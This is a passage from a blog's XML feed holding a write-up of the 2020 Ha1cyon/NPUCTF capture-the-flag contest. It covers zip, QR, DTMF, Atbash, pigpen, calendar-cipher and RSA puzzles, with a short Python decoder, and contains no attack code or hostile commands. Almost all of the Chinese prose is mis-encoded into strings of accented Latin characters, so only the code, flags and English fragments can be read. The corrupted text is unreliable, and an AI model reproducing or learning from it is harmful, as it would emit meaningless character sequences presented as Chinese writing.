”ç©¶ä½¿ç”¨ï¼Œè¯·å‹¿ç”¨äºéæ³•ç”¨é€”ã€‚</strong></p><p>å¥½åƒè¿™ç¯‡æœ‰ç‚¹æ°´å”‰ï¼ˆå…ˆä¸ç®¡äº†</p><p>å‘¨æ—¥è¿˜è¦è¡¥å‘¨ä¸€çš„è¯¾å‘¢ï¼ˆ</p><p><em>ï¼ˆæºœäº†æºœäº†</em></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | 2020 Ha1cyon_CTFå…¬å¼€èµ› WriteUp</title>
      <link href="2020/04/21/CTF_2020Ha1cyonCTF/"/>
      <url>2020/04/21/CTF_2020Ha1cyonCTF/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>çœ‹ CTF ç¾¤é‡Œæœ‰å¤§ä½¬å¼•æµï¼Œè¯´å‘¨æœ«è¥¿åŒ—ç“œå¤§ï¼ˆNPUï¼‰æœ‰ä¸ª CTF æ¯”èµ›ï¼Œ<strong>æ®è¯´å¯¹èŒæ–°æ¯”è¾ƒå‹å¥½</strong>ï¼Œäºæ˜¯å°±æ¥çœ‹äº†çœ‹ã€‚</p><p><strong>å®˜æ–¹å¹³å°åœ°å€ï¼š</strong><a href="http://ha1cyon-ctf.fun:666/">http://ha1cyon-ctf.fun:666/</a></p><p>å‘¨å…­æ¯”èµ›åˆšå¼€å§‹ï¼Œå¹³å°å°±è¢« DDoS äº†ï¼Œäºæ˜¯é‚£æ—¶åªä¸‹è½½äº†ä¸€é“é¢˜ç›®çš„é™„ä»¶å°±å•¥ä¹Ÿæ²¡äº†â€¦â€¦æ¯”èµ›è¿‡ç¨‹ä¸­å¹³å°ä¹Ÿå±¡å—æ”»å‡»ï¼Œç«¯å£æ¢äº†å¥½å‡ æ¬¡ï¼Œæ¯”å¦‚ 666-&gt;777-&gt;778-&gt;777-&gt;98xï¼Œå¹³å°ç”¨åŠ¨æ€ç«¯å£è¿˜æ˜¯ç¬¬ä¸€æ¬¡è§å‘¢ 23333ã€‚</p><p>ç»“æœæ¯”èµ›æ—¶é—´ä¸€ç›´æ‹–åˆ°äº†å‘¨äºŒæ™šä¸Šï¼Œé¢˜ç›®è¿˜è¶Šæ¥è¶Šå¤šï¼Œå™¢ï¼Œæ˜¯<strong>ä¸ä¼šçš„é¢˜ç›®è¶Šæ¥è¶Šå¤šäº†</strong>ï¼</p><p>éšä¾¿å†™ç‚¹ Writeup å¥½äº†ï¼Œä¸»è¦æ˜¯ä¼šåšçš„éƒ¨åˆ†å§ï¼Œé¡ºä¾¿è®°å½•äº†ä¸€ä¸‹åšé¢˜çš„ä½“ä¼šå•¦ã€‚</p><p><em>ï¼ˆåé¢å†çœ‹å¿ƒæƒ…ä¼šä¸ä¼šæŒ‰ç…§å¤§ä½¬ä»¬çš„ WP å¤ç°ä¸€ä¸‹</em></p><br><hr><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="HappyCheckInVerification"><a href="#HappyCheckInVerification" class="headerlink" title="HappyCheckInVerification"></a>HappyCheckInVerification</h3><p>å‹ç¼©åŒ…ä¸­çš„ endLocator è¢«æ”¹åˆ°æœ€å‰é¢äº†ï¼ŒæŒªå›å»ã€‚ç„¶åæŠŠä¼ªåŠ å¯†å»æ‰ã€‚ä¿®æ”¹å¦‚ä¸‹é¢çº¢è‰²éƒ¨åˆ†æ‰€ç¤ºã€‚</p><p><img src="/2020/04/21/CTF_2020Ha1cyonCTF/misc_zip.png" alt="misc_zip"></p><p>è§£å‹å‡ºæ¥ä¸€ä¸ªæ˜¯é»‘äººæŠ¬æ£ºçš„è§†é¢‘ï¼ˆçœŸçš„æœ‰å•Šã€‚ã€‚ï¼‰ï¼Œå¦ä¸€ä¸ªæ˜¯ä¸€ä¸ªäºŒç»´ç ã€‚</p><p><img src="/2020/04/21/CTF_2020Ha1cyonCTF/wklv_lv_iodj.png" alt="wklv_lv_iodj"></p><p>æ‹‰åˆ° PS é‡Œè¡¥ä¸Šä¸‰ä¸ªè§’ï¼Œå¾—åˆ°ä¸‹é¢è¿™å›¾ã€‚</p><p><img src="/2020/04/21/CTF_2020Ha1cyonCTF/wklv_lv_iodj_new.png" alt="wklv_lv_iodj_new"></p><p>æ‰«ç å¾—åˆ°ï¼š</p><pre class="language-none"><code class="language-none">?flag{this_is_not_flag}ä¸‰æ›³æ‰€è«³é™€æ€¯è€¶å—å¤œç¼½å¾—é†¯æ€¯å‹æ•¸ä¸çŸ¥å–ç›§ç‘Ÿä¾„ç›¡é æ•…éš¸æ€¯è–©ä¸å¨‘ç¾¯æ¶…å†¥ä¼Šç›§è€¶è«³æåº¦å¥¢é“ç›§å†¥ä»¥æœ‹ç½°æ‰€å³æ —è«³è’™é›†çš¤å¤·å¤œé›†è«³åˆ©é¡›å‘å¯«ç„¡æ€¯ä¾å¥¢ç«Ÿ#ï¿¥#%E68BBFE4BD9BE68B89E6A0BCE79A84E5A7BFE58ABFE59CA8E69C80E5908E32333333||254333254242254338254342254231254338254345254432254238254643254236254145254239254441254437254234254232254131254236254245253244253244254343254438254330254341254336254435...sadwq#asdsadasf faf$use$dasdasdafafa_$ba##se64$</code></pre><p>ç¬¬ä¸€éƒ¨åˆ†</p><pre class="language-none"><code class="language-none">ä¸‰æ›³æ‰€è«³é™€æ€¯è€¶å—å¤œç¼½å¾—é†¯æ€¯å‹æ•¸ä¸çŸ¥å–ç›§ç‘Ÿä¾„ç›¡é æ•…éš¸æ€¯è–©ä¸å¨‘ç¾¯æ¶…å†¥ä¼Šç›§è€¶è«³æåº¦å¥¢é“ç›§å†¥ä»¥æœ‹ç½°æ‰€å³æ —è«³è’™é›†çš¤å¤·å¤œé›†è«³åˆ©é¡›å‘å¯«ç„¡æ€¯ä¾å¥¢ç«Ÿ</code></pre><p> è¿™ä¸€æ®µæ‰”å»<a href="http://keyfc.net/bbs/tools/tudoucode.aspx">ä½›æ›°</a>ï¼Œå¾—åˆ°ï¼š</p><blockquote><p>è¯´äº†è¿™ä¸æ˜¯ä½›æ‹‰æ ¼ï¼Œä½ è¿˜æ¥è½¬ï¼Ÿç»™çˆ·çˆªå·´</p></blockquote><p>ä½›æ‹‰æ ¼ flag å¯è¿˜è¡Œâ€¦çœ‹æ¥ä¸æ˜¯äº†ã€‚</p><p>ä¸­é—´ä¸€æ®µ </p><pre class="language-none"><code class="language-none">E68BBFE4BD9BE68B89E6A0BCE79A84E5A7BFE58ABFE59CA8E69C80E5908E32333333</code></pre><p>æ‹¿å» base16 ä¸€ä¸‹å¾—åˆ°ï¼š</p><blockquote><p>æ‹¿ä½›æ‹‰æ ¼çš„å§¿åŠ¿åœ¨æœ€å2333</p></blockquote><p>ä¸‹ä¸€éƒ¨åˆ† </p><pre class="language-none"><code class="language-none">254333254242254338254342254231254338254345254432254238254643254236254145254239254441254437254234254232254131254236254245253244253244254343254438254330254341254336254435</code></pre><p>base16 å¾—åˆ°ï¼š</p><blockquote><p>%C3%BB%C8%CB%B1%C8%CE%D2%B8%FC<br>%B6%AE%B9%DA%D7%B4%B2%A1%B6%BE<br>%2D%2D%CC%D8%C0%CA%C6%D5</p></blockquote><p>çœ‹ä¸Šå»æ˜¯ urlencodeï¼Œè§£ç å¾—åˆ°ï¼š</p><p>ï¼ˆè¿™é‡Œæ°”æ­»æˆ‘äº†ï¼Œå±…ç„¶ç”¨çš„ gb2312 ç¼–ç è€Œä¸æ˜¯ UTF-8ï¼Œæˆ‘ä»¥ä¸ºå‡çš„åŠå¤©è§£ä¸å‡ºæ¥ï¼Œè™½ç„¶çš„ç¡®æ²¡å•¥ç”¨â€¦</p><blockquote><p>æ²¡äººæ¯”æˆ‘æ›´æ‡‚å† çŠ¶ç—…æ¯’â€“ç‰¹æœ—æ™®</p></blockquote><p><img src="/2020/04/21/CTF_2020Ha1cyonCTF/image-20200421224413508.png" alt="urldecode"></p><p>åé¢è¿™éƒ¨åˆ†æ²¡çœ‹æ˜ç™½ï¼Œä½†æ„Ÿè§‰æ˜¯æç¤ºäº† use base64.</p><p>å¦å¤–ï¼Œå‘ç°é»‘äººæŠ¬æ£ºè§†é¢‘é‡Œåˆå‡ºç°äº†ç†Ÿæ‚‰çš„æ‹¨å·å£°ï¼Œå°±æ˜¯<a href="https://miaotony.xyz/2020/03/15/CTF_2020XCTF_gxzy/">ä¹‹å‰åœ¨XCTFé«˜æ ¡æˆ˜â€œç–«â€é‡Œ</a>ç¢°åˆ°çš„ <strong>DTMF ä¿¡å·</strong>ã€‚</p><p>äºæ˜¯æŠŠè§†é¢‘å¯¼å‡ºäº†éŸ³é¢‘ï¼Œç„¶åæ‹–åˆ° Audacity é‡Œï¼ŒæŸ¥çœ‹<strong>é¢‘è°±å›¾</strong>ï¼Œ<strong>æå–å‡ºå¸¦æœ‰æ‹¨å·å£°çš„ç‰‡æ®µ</strong>ï¼Œå¹¶é™åˆ¶é¢‘ç‡èŒƒå›´ï¼Œå¾—åˆ°ä¸‹é¢çš„å›¾ã€‚</p><p><img src="/2020/04/21/CTF_2020Ha1cyonCTF/dtmf.png" alt="dtmf"></p><table><thead><tr><th></th><th>1209 Hz</th><th>1336 Hz</th><th>1477 Hz</th><th>1633 Hz</th></tr></thead><tbody><tr><td>697 Hz</td><td>1</td><td>2</td><td>3</td><td>A</td></tr><tr><td>770 Hz</td><td>4</td><td>5</td><td>6</td><td>B</td></tr><tr><td>852 Hz</td><td>7</td><td>8</td><td>9</td><td>C</td></tr><tr><td>941 Hz</td><td>*</td><td>0</td><td>#</td><td>D</td></tr></tbody></table><p>å¯¹ç…§è¡¨æ ¼å¾—åˆ° <code>418070885</code>ã€‚<em>ï¼ˆ<del>å¯èƒ½æœ‰è¯¯ï¼Œåº”è¯¥æ˜¯ä¸ªæ‰‹æœºå·ç ï¼Œå¯èƒ½æ¼äº†å‡ ä½</del></em>  </p><p><strong>ï¼ˆæ˜¯ <code>13418070885</code></strong></p><p>base64 -&gt; <del><code>NDE4MDcwODg1</code></del> <code>MTM0MTgwNzA4ODU=</code></p><p>å¥—ä¸Šflagï¼Œ<del><code>flag{nde4mdcwodg1}</code></del></p><p>å‘ç°<strong>ä¸å¯¹ï¼ï¼ï¼ï¼ï¼</strong>  <em>ï¼ˆç„¶ååšä¸ä¸‹å»äº†å˜¤å˜¤å˜¤</em></p><blockquote><p>èµ›åæ‰¾åˆ°äº†ä¸€ä¸ªè½¯ä»¶å¯ä»¥åˆ†æ DTMF ä¿¡å·ï¼Œå°±æ˜¯ *<em><code>dtmf2num.exe</code>**ï¼Œ<a href="https://dl.pconline.com.cn/download/462419-1.html">åœ¨è¿™é‡Œ</a>å¯ä»¥ä¸‹è½½ã€‚è¿™é‡Œæ˜¯å®ƒ sourceforge çš„<a href="http://freshmeat.sourceforge.net/projects/dtmf2num">é¡¹ç›®åœ°å€</a>ã€‚</em>ï¼ˆå¥½å¤è€ä¸€ä¸ªè½¯ä»¶äº†*</p><p>ä¸è¿‡è¿™é¢˜è¦ç”¨è½¯ä»¶çš„è¯éœ€è¦æˆªå–å¯¹åº”çš„ç‰‡æ®µæ‰è¡Œï¼Œæ¯•ç«Ÿ BGM å¤ªæ‚äº†è€Œä¸”é¢‘ç‡ä¿¡å·æ¯”è¾ƒæœ‰è§„å¾‹â€¦â€¦</p></blockquote><blockquote><p>By the wayï¼ŒæŠ›å¼€é¢˜ç›®æ¥è¯´ï¼Œè¿™ä¸ª BGM å°±å±äºç”µéŸ³å˜›ï¼Œå°±ä¸€å †æœ‰è§„å¾‹çš„é¢‘ç‡ä¿¡å·çš„ç»„åˆå”‰ï¼Œè¿˜å¸¦æœ‰è¿ç»­è°ƒé¢‘ã€‚ã€‚</p></blockquote><p>åé¢çœ‹äº†å¤§ä½¬çš„ WPï¼Œå‘ç°éœ€è¦æŠŠ b64encode åçš„ç»“æœå‘åˆ°è¥¿åŒ—ç“œå¤§ä¿¡å®‰åä¼šçš„å…¬ä¼—å·<small style="color: white;"><em>ï¼ˆNWPUSECï¼‰</em></small>ï¼ˆå±…ç„¶è¿™æ ·å¼•æµï¼ï¼‰ï¼Œå¾—åˆ°ä¸€ä¸ªéŸ³é¢‘ä¿¡å·ï¼Œæ˜¯æ— çº¿ç”µä¼ è¾“çš„å›¾åƒï¼Œè§£ç å¾—åˆ°çš„å›¾ç‰‡é‡Œå°±æœ‰ flagâ€¦â€¦</p><p>ï¼ˆçœŸæƒ³ä¸å‡ºæ¥ï¼Œå•Šæ˜¯æ— çº¿ç”µå¤§ä½¬ï¼Misc çœŸçš„æ‚ã€‚</p><p><img src="/2020/04/21/CTF_2020Ha1cyonCTF/gzh.png" alt="å…¬ä¼—å·å›å¤"></p><br><h3 id="æŠ½è±¡å¸¦å¸ˆ"><a href="#æŠ½è±¡å¸¦å¸ˆ" class="headerlink" title="æŠ½è±¡å¸¦å¸ˆ"></a>æŠ½è±¡å¸¦å¸ˆ</h3><p><img src="/2020/04/21/CTF_2020Ha1cyonCTF/image-20200421135805788.png" alt="é¢˜ç›®"></p><p><code>NPUCTF{æ¬¢è¿æ¥åˆ°è¥¿åŒ—å·¥ä¸šå¤§å­¦CTFæ¯”èµ›ä¸–ç•Œä¸Šæœ€ç®€å•çš„æ¯”èµ›}</code></p><p>æ‚¨ä¹Ÿæ˜¯<strong>æŠ½è±¡å¸¦å¸ˆ</strong>ï¼Ÿ</p><p>å†ä¹Ÿä¸ä¿¡ä»€ä¹ˆ Easy/(Real) Ez/Baby/Basic/Not Hard/â€¦ éƒ½æ˜¯å‡çš„å‡çš„ã€‚</p><br><h3 id="parts"><a href="#parts" class="headerlink" title="parts"></a>parts</h3><p>å¥½å‡ ä¸ªpartsï¼Œzde0, zde1, zfr0, â€¦</p><p>çœ‹æ–‡ä»¶å¤´æ˜¯ä¸€å †å‹ç¼©åŒ…ï¼Œè§£å‡ºæ¥æœ‰ä¸ª hint</p><pre class="language-none"><code class="language-none">Here's the hint:33 * 33 = 1089And everything is inside the image</code></pre><p>è¿˜æœ‰ä¸€å¼ å›¾ï¼Œ<code>BV1kx411F7Fn.png</code></p><p><img src="/2020/04/21/CTF_2020Ha1cyonCTF/BV1kx411F7Fn.png" alt="BV1kx411F7Fn"></p><p>çœ‹æ¥ flag åœ¨å›¾ç‰‡é‡Œï¼Œä¸è¿‡ 33*33 æ²¡çœ‹æ˜ç™½ã€‚</p><p>foremost æå–ä¸å‡ºæ¥ï¼Œçœ‹ Hex æ–‡ä»¶æ˜¯æœ‰ç‚¹é—®é¢˜ã€‚</p><p>å›¾ç‰‡æ–‡ä»¶åçœ‹ä¸Šå»åƒæ˜¯ Bç«™çš„ BV å·ï¼Œä¸Šå»çœ‹äº†ä¸€ä¸‹æ²¡æ‰¾åˆ°ä»€ä¹ˆçº¿ç´¢â€¦â€¦</p><br><h3 id="åƒäº†å®ƒ"><a href="#åƒäº†å®ƒ" class="headerlink" title="åƒäº†å®ƒ"></a>åƒäº†å®ƒ</h3><p><code>may be hint.txt</code>æç¤º</p><pre class="language-none"><code class="language-none">emmmmm...something important was hidden in secret, but I can't find it!</code></pre><p><code>lookatme.txt</code></p><p><img src="/2020/04/21/CTF_2020Ha1cyonCTF/lookatme.png" alt="lookatme"></p><p>ä¸‹é¢æœ‰ä¸€æ®µè«åå¥‡å¦™çš„ç©ºç™½å­—ç¬¦ã€‚ä¸æ¸…æ¥šå•¥ç©æ„äº†ã€‚</p><p><img src="/2020/04/21/CTF_2020Ha1cyonCTF/lookatme_2.png" alt="ç©ºç™½å­—ç¬¦"></p><p><code>secret</code>æ–‡ä»¶å¤´æ˜¯ <code>MPE1</code>ï¼ˆ4D 50 45 31ï¼‰ï¼Œæœäº†ä¸€ä¸‹æ²¡æ‰¾åˆ°ç›¸å…³çš„æ–‡ä»¶æ ¼å¼å‘¢ã€‚</p><p>è¹² WPã€‚</p><br><hr><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="æŸ¥æºç "><a href="#æŸ¥æºç " class="headerlink" title="æŸ¥æºç "></a>æŸ¥æºç </h3><p>ç»ˆäºçœ‹åˆ°æœ‰é€åˆ†é¢˜äº†ï¼</p><p>å°±æ˜¯æŸ¥æºç å®Œäº‹ã€‚</p><p>F12 ç¦æ‰äº†ï¼Œç”¨ <code>Ctrl + Shift + C</code> æˆ–è€…ç‚¹æµè§ˆå™¨çš„ Web å¼€å‘è€… ä¹‹ç±»çš„å°±è¡Œã€‚</p><br><hr><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Classical-Cipher"><a href="#Classical-Cipher" class="headerlink" title="Classical_Cipher"></a>Classical_Cipher</h3><p><code>key.txt</code> ä¸­æç¤ºï¼š</p><pre class="language-none"><code class="language-none">è§£å¯†åçš„flagè¯·ç”¨flag{}åŒ…è£¹å‹ç¼©åŒ…å¯†ç ï¼šgsv_pvb_rh_zgyzhså¯¹åº”æ˜æ–‡ï¼š   ***_key_**_******</code></pre><p>çœ‹äº†ä¸€ä¸‹ï¼Œä¸æ˜¯å‡¯æ’’ã€‚äºæ˜¯ä¸¢åˆ° <a href="https://quipqiup.com/"><em>quipqiup</em></a> å»è§£å¯†ï¼Œå·²çŸ¥ pvb=keyã€‚</p><p>æ ¹æ®å¾—åˆ°çš„ç­”æ¡ˆï¼Œå¤§æ¦‚å½¢å¼æ˜¯ the_key_is_??????ï¼Œåé¢è¿™ä¸ªä¸å¤§å¯¹ï¼Œäºæ˜¯æ”¹å˜ clues ä¸º <code>pvb=key rh=is gs=th</code>ï¼Œå¾—åˆ°åˆç†çš„è§£ä¸º <code>the_key_is_atbash</code>ã€‚</p><p><img src="/2020/04/21/CTF_2020Ha1cyonCTF/quipquip.png" alt="quipquip"></p><blockquote><p>å™¢ï¼Œèµ›åå‘ç°è¿™æ˜¯ <code>atbash</code> ç¼–ç ï¼ˆåŸƒç‰¹å·´ä»€ç ï¼‰ï¼Œä¸€ç§å¤å…¸çš„å¯†ç ã€‚</p><p>å¯†æ–‡å°±æ˜¯å­—æ¯è¡¨åè¿‡æ¥å¯¹åº”ä½ç½®çš„å­—æ¯ï¼Œå³å¯†æ–‡å’Œæ˜æ–‡å­—æ¯çš„å¯¹åº”ä½ç½®ä¹‹å’Œä¸º27.</p><p>å¸¸æ–‡ï¼šA B C D E F G H I J K L M N O P Q R S T U V W X Y Z</p><p>å¯†æ–‡ï¼šZ Y X W V U T S R Q P O N M L K J I H G F E D C B A</p></blockquote><p>æ‹¿è¿™ä¸ªå¯†ç å»è§£å‹ <code>flag.zip</code>ï¼Œå¾—åˆ°ä¸€å¼ å›¾ç‰‡ã€‚</p><p><img src="/2020/04/21/CTF_2020Ha1cyonCTF/Classical_Cipher_flag.png" alt="flag"></p><p>åˆæ˜¯æŠ½è±¡å¸¦å¸ˆã€‚æœ‰ä¸€éƒ¨åˆ†æ˜¯çŒªåœˆå¯†ç çš„å˜ç§ï¼Œè§ä¸‹å›¾ã€‚</p><p><img src="/2020/04/21/CTF_2020Ha1cyonCTF/zhuquan.jpg" alt="img"></p><p><code>C??SSIC??C??E</code></p><p>å‰©ä¸‹çš„çªç„¶æƒ³åˆ°æ˜¯å­—ç¬¦å½¢çŠ¶çš„å­—ä½“äº†ï¼Œè”æƒ³é¢˜ç›® Classical Cipherï¼Œåº”è¯¥æ˜¯ classicalã€‚</p><p>æ‰¾äº†ä¸ªè¯†åˆ«å­—ä½“çš„ç½‘ç«™ï¼Œæ¯”å¦‚<a href="https://www.likefont.com/">è¿™ä¸ª</a>ï¼Œç„¶åå¯¹åº”ä¸€æ³¢å‘ç°çœŸçš„æœ‰ï¼</p><p><img src="/2020/04/21/CTF_2020Ha1cyonCTF/image-20200418221049215.png" alt="è¯†åˆ«å­—ä½“"></p><p>åœ¨ <strong>Egypt0 Regular</strong> é‡Œæ²¡æ‰¾åˆ°ï¼Œå€’æ˜¯åœ¨ <strong>ROSETTA STONE Regular</strong> é‡Œæ‰¾åˆ°äº†ã€‚</p><p><img src="/2020/04/21/CTF_2020Ha1cyonCTF/image-20200418221125237.png"></p><p>äºæ˜¯å°±æ˜¯ <code>CLASSICALCODE</code>ï¼ˆå…¶å®å¯¹åº”ä¸ŠDå°±çŒœåˆ°æ˜¯<code>code</code>äº†ï¼‰ã€‚<code>flag{CLASSICALCODE}</code>äº¤ä¸Šå»å‘ç°ä¸å¯¹ï¼Œè¦æ¢æˆå°å†™ã€‚</p><p><code>flag{classicalcode}</code></p><blockquote><p>åŸæ¥è¿™æ˜¯å¤åŸƒåŠè±¡å½¢æ–‡å­—â€¦</p><p><img src="/2020/04/21/CTF_2020Ha1cyonCTF/JGO2y6.png" alt="å¤åŸƒåŠè±¡å½¢æ–‡å­—"></p></blockquote><blockquote><p>æ›´å¤šå¯†ç å¯ä»¥çœ‹è¿™ç¯‡æ–‡ç« ï¼š<a href="http://www.tuicool.com/articles/2E3INnm">http://www.tuicool.com/articles/2E3INnm</a></p></blockquote><br><h3 id="è¿™æ˜¯ä»€ä¹ˆè§…ğŸ"><a href="#è¿™æ˜¯ä»€ä¹ˆè§…ğŸ" class="headerlink" title="è¿™æ˜¯ä»€ä¹ˆè§…ğŸ"></a>è¿™æ˜¯ä»€ä¹ˆè§…ğŸ</h3><p><img src="/2020/04/21/CTF_2020Ha1cyonCTF/flag.jpg" alt="flag"></p><blockquote><p>2020å¹´4æœˆ</p><p>F1 W1 S22 S21 T12 S11 W1 S13</p></blockquote><p>æ˜¯<strong>æ—¥å†å¯†ç </strong>å”‰ï¼ï¼ˆçœŸä¼šç©å‘¢</p><p>3 1 12 5 14 4 1 18</p><pre class="language-python" data-language="python"><code class="language-python">l<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">]</span>s<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> l<span class="token punctuation">:</span>s<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">)</span><span class="token operator">+</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span></code></pre><p>å¾—åˆ° <code>CALENDAR</code></p><p><code>flag{calendar}</code></p><blockquote><p><strong>æ—¥å†å¯†ç åŸåˆ™ï¼š</strong>  </p><p>ï¼ˆ1ï¼‰1â€”26ä»£è¡¨aâ€”z26ä¸ªè‹±æ–‡å­—æ¯ï¼›ï¼ˆ2ï¼‰M,T1,W,T2,F,S1,S2åˆ†åˆ«ä»£è¡¨å‘¨ä¸€åˆ°å‘¨æ—¥ä¸ƒå¤©ï¼ˆè‹±æ–‡é¦–å­—æ¯ä»£æ›¿ï¼Œ1ï¼Œ2ä¸ºäº†æœ‰åˆ«ï¼Œä¹Ÿäººä¸ºå¢åŠ å¯†åº¦ï¼‰ï¼›ï¼ˆ3ï¼‰å¯†é’¥å³å¯†ç è¡¨  </p><p>ä»¥2007å¹´11æœˆä»½çš„æ—¥å†ä¸ºå¯†ç è¡¨ï¼Œæˆ‘ä»¬æ¥åŠ å¯†è¿™ä¸ªå•è¯ï¼šdictionary<br>ç¬¬ä¸€æ­¥ï¼Œç”¨æ•°å­—ä»£æ›¿æ˜æ–‡ä¸­çš„å­—æ¯ï¼Œå³D I  C  T  I  O  N  A  R  Y;<br>                     4  9 3 20  9 15  14 1  18 25<br>ç¬¬äºŒæ­¥ï¼Œå†™å¯†æ–‡ã€‚<br>æ–¹æ³•ï¼šä¾‹å¦‚å•è¯é¦–å­—æ¯Dç”¨4ä»£æ›¿ï¼Œåˆ™åœ¨æ—¥å†ä¸­æ‰¾åˆ°4å·ï¼Œå‘ç°æ˜¯æœ¬æœˆç¬¬ä¸€ä¸ªæ˜ŸæœŸæ—¥ï¼Œæ‰€ä»¥ç”¨S21è¡¨ç¤ºï¼›åˆå¦‚ç¬¬ä¸ƒä¸ªå­—æ¯Nç”¨æ•°å­—14ä»£è¡¨ï¼Œæ‰¾åˆ°14å·ï¼Œå‘ç°æ˜¯æœ¬æœˆç¬¬äºŒä¸ªæ˜ŸæœŸä¸‰ï¼Œç”¨W2ä»£è¡¨ã€‚å¦‚æ­¤ç±»æ¨ï¼Œå¾—åˆ°å¯†æ–‡å¦‚ä¸‹ï¼š<br>S21 F2 S11 T13 F2 T23 W2 T21 S23 S24  </p><p><strong>æ­¤ç±»å¯†ç çš„è§£æ³•å¦‚ä¸‹ï¼š</strong><br>ï¼ˆ1ï¼‰é¦–å…ˆè¦çŸ¥é“å¯†é’¥ï¼Œå³å¯†ç è¡¨ï¼›<br>ï¼ˆ2ï¼‰å…¶æ¬¡åˆ†è§£å¯†ç ä¸­çš„æ˜ŸæœŸ iï¼Œå³å˜æˆæ˜ŸæœŸ+æ•°å­—çš„å½¢å¼ï¼›<br>ï¼ˆ3ï¼‰å»å¯»æ‰¾å¯¹åº”çš„æ˜¯ç¬¬å‡ ä¸ªå‡ºç°çš„æ˜ŸæœŸ iï¼Œå¯¹åº”æ—¥æœŸï¼›<br>ï¼ˆ4ï¼‰å¯¹åº”å­—æ¯ï¼Œç»ƒæˆå•è¯ï¼ŒçŸ­è¯­æˆ–å¥å­ã€‚  </p></blockquote><br><h3 id="è®¤æ¸…å½¢åŠ¿ï¼Œå»ºç«‹ä¿¡å¿ƒ"><a href="#è®¤æ¸…å½¢åŠ¿ï¼Œå»ºç«‹ä¿¡å¿ƒ" class="headerlink" title="è®¤æ¸…å½¢åŠ¿ï¼Œå»ºç«‹ä¿¡å¿ƒ"></a>è®¤æ¸…å½¢åŠ¿ï¼Œå»ºç«‹ä¿¡å¿ƒ</h3><p>é¢˜ç›®å¦‚ä¸‹ï¼Œçœ‹ä¸Šå»å°±æ˜¯ RSA ä¹‹ç±»çš„å§ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> secret <span class="token keyword">import</span> flagp <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span>e <span class="token operator">=</span> <span class="token comment"># Hidden</span>q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span>n <span class="token operator">=</span> p <span class="token operator">*</span> qm <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">b"npuctf{"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">b"}"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''169169912654178  128509160179202  518818742414340  358553002064450  '''</span></code></pre><p>è¿™æ¬¡å»çœ‹äº†ä¸€äº› RSA çš„çŸ¥è¯†ï¼Œç„¶è€Œä¸å¤§æ˜ç™½è¿™äº›åŠ å¯†ç®—æ³•ï¼Œæ›´ä¸äº†è§£ç›¸å…³çš„è§£å¯†ç®—æ³•ï¼Œè¿˜æ²¡æœ‰ OI åŸºç¡€ï¼Œäºæ˜¯é¢˜ç›®çœ‹èµ·æ¥æŒºç®€å•çš„ç„¶è€Œè¿˜æ˜¯ä¸å¤§ä¼šè§£ emmmï¼ˆï¼ˆ</p><p>ï¼ˆ<code>Crypto</code>æ¨¡å—éƒ½ä¸å¤§ç†Ÿæœ‰å“ªäº›ç°æˆæ–¹æ³•ï¼Œ<code>gmpy2</code> æ¨¡å—è£…äº†åŠå¤©è¿˜æ²¡è£…å¥½ã€‚ã€‚</p><p>é¢˜ç›®åº”è¯¥å« <code>è®¤æ¸…å½¢åŠ¿ï¼Œæ”¾å¼ƒå¹»æƒ³</code> æ‰å¯¹å§ã€‚</p><br><hr><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="machineï¼ˆä¸è®°å¾—é¢˜ç›®äº†"><a href="#machineï¼ˆä¸è®°å¾—é¢˜ç›®äº†" 